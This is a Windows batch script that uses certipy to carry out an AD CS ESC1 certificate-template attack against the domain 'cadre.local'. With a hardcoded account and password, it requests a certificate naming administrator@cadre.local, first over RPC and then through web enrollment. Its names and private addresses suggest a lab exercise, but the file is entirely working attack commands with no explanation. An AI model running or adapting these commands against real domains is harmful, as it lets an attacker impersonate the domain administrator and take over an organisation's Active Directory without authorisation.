@echo off
REM Branch B WT050 ESC1 — certipy req as chief_command, try RPC dynamic-endpoint then web
cd /d C:\Tools\cadre-attack
set PY=C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts
set PYTHONIOENCODING=utf-8

echo === ATTEMPT 1: RPC with -dynamic-endpoint -target-ip ===
%PY%\certipy.exe req -u chief_command@cadre.local -p "C0mm@nd_Ch1ef!" -dc-ip 192.168.77.10 -ca cadre-CA -target dc01.cadre.local -target-ip 192.168.77.10 -dynamic-endpoint -template CADRE-ESC1 -upn administrator@cadre.local -out esc1-admin 2>&1
echo RPC_RC %ERRORLEVEL%
if exist esc1-admin.pfx goto DONE

echo === ATTEMPT 2: Web Enrollment ===
%PY%\certipy.exe req -u chief_command@cadre.local -p "C0mm@nd_Ch1ef!" -dc-ip 192.168.77.10 -ca cadre-CA -target dc01.cadre.local -target-ip 192.168.77.10 -web -template CADRE-ESC1 -upn administrator@cadre.local -out esc1-admin 2>&1
echo WEB_RC %ERRORLEVEL%

:DONE
dir esc1-admin.pfx 2>&1
